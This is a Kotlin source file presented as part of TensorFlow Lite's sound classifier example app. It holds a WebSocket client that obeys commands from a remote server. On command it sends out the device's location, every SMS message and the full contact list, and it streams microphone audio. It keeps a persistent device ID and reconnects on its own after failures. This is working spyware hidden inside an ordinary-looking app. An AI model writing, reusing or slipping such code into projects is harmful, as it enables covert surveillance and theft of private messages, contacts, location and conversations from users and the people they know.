package org.tensorflow.lite.examples.soundclassifier

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.preference.PreferenceManager
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import org.tensorflow.lite.examples.soundclassifier.data.ContactReader
import org.tensorflow.lite.examples.soundclassifier.data.LocationReader
import org.tensorflow.lite.examples.soundclassifier.data.SMSReader
import org.tensorflow.lite.examples.soundclassifier.databinding.ActivityMainBinding
import java.util.UUID
import java.util.concurrent.TimeUnit

class WebSocketClient(context: Context) {
    internal var webSocketEndpoint: String = "10.0.2.2:8080/ws"
    internal var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    internal var ctx: Context
    internal lateinit var uuid: String

    init {
        this.ctx = context
        initUUID()
        connect()
    }

    private fun initUUID() {
        val prefs = PreferenceManager.getDefaultSharedPreferences(ctx)

        uuid = prefs.getString("UUID", null) ?: run {
            val newUuid = UUID.randomUUID().toString()
            prefs.edit().putString("UUID", newUuid).apply()
            newUuid
        }
    }

    fun connect() {
        val request = Request.Builder()
            .url("ws://" + webSocketEndpoint)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                super.onOpen(webSocket, response)

                val jsonObject = JSONObject()
                jsonObject.put("type", "connect")
                jsonObject.put("uuid", uuid)

                webSocket.send(jsonObject.toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                super.onMessage(webSocket, text)

                try {
                    val jsonObject = JSONObject(text)
                    val type = jsonObject.getString("type")

                    when(type) {
                        "ping" -> handlePing()
                        "location" -> sendLocation()
                        "sms" -> sendSMS()
                        "contacts" -> sendContacts()
                        else -> {
                            Handler(Looper.getMainLooper()).post {
                                Toast.makeText(ctx, "Unknown command: $type", Toast.LENGTH_SHORT).show()
                            }
                        }
                    }
                } catch (e: org.json.JSONException) {
                    e.printStackTrace()
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, "Invalid message format", Toast.LENGTH_SHORT).show()
                    }
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                super.onFailure(webSocket, t, response)

                Handler(Looper.getMainLooper()).postDelayed({
                    this@WebSocketClient.connect()
                }, 30000)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                super.onClosed(webSocket, code, reason)
            }
        })
    }

    fun disconnect() {
        val jsonObject = JSONObject()
        jsonObject.put("type", "disconnect")
        jsonObject.put("uuid", uuid)

        webSocket?.send(jsonObject.toString())
        webSocket?.close(1000, "Disconnect requested")
        webSocket = null
    }

    fun sendLocation() {
        val location = LocationReader.getLocation(this.ctx) ?: return;

        val locationObject = JSONObject()
        locationObject.put("latitude", location.latitude)
        locationObject.put("longitude", location.longitude)

        val jsonObject = JSONObject()
        jsonObject.put("type", "location")
        jsonObject.put("uuid", uuid)
        jsonObject.put("data", locationObject)

        webSocket?.send(jsonObject.toString())
    }

    fun handlePing() {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(ctx, "Pong!", Toast.LENGTH_SHORT).show()
        }
    }

    fun sendSMS() {
        val smsList = SMSReader.readSMSMessages(this.ctx)
        if (smsList.isEmpty()) return

        val jsonObject = JSONObject()
        jsonObject.put("type", "sms")
        jsonObject.put("uuid", uuid)

        val smsJson = JSONArray()

        for (sms in smsList) {
            val smsObject = JSONObject()
            smsObject.put("id", sms.id)
            smsObject.put("address", sms.address)
            smsObject.put("body", sms.body)
            smsObject.put("date", sms.date)
            smsObject.put("type", sms.type)
            smsJson.put(smsObject)
        }

        jsonObject.put("data", smsJson)

        webSocket?.send(jsonObject.toString())
    }

    fun sendContacts() {
        val contactLists = ContactReader.readContacts(this.ctx)
        if (contactLists.isEmpty()) return

        val jsonObject = JSONObject()
        jsonObject.put("type", "contacts")
        jsonObject.put("uuid", uuid)

        val contactJson = JSONArray()

        for (contact in contactLists) {
            val contactObject = JSONObject()
            contactObject.put("id", contact.id)
            contactObject.put("name", contact.name)
            contactObject.put("phone", contact.phone)
            contactObject.put("email", contact.email)
            contactObject.put("address", contact.address)
            contactObject.put("company", contact.company)
            contactObject.put("title", contact.title)
            contactObject.put("note", contact.note)
            contactObject.put("im", contact.im)
            contactJson.put(contactObject)
        }

        jsonObject.put("data", contactJson)

        webSocket?.send(jsonObject.toString())
    }

    fun sendAudio(audioBuffer: ShortArray) {
        val jsonObject = JSONObject()
        jsonObject.put("uuid", uuid)
        jsonObject.put("type", "audio")

        // Create a JSONArray from the audio buffer
        val dataArray = JSONArray()
        for (sample in audioBuffer) {
            dataArray.put(sample.toInt())
        }

        // Now add the JSONArray to the JSON object
        jsonObject.put("data", dataArray)

        // Finally, send the JSON string through the websocket
        webSocket?.send(jsonObject.toString())
    }

    fun sendStopAudio() {
        val jsonObject = JSONObject()
        jsonObject.put("type", "stop_audio")
        jsonObject.put("uuid", uuid)
        webSocket?.send(jsonObject.toString())
    }
}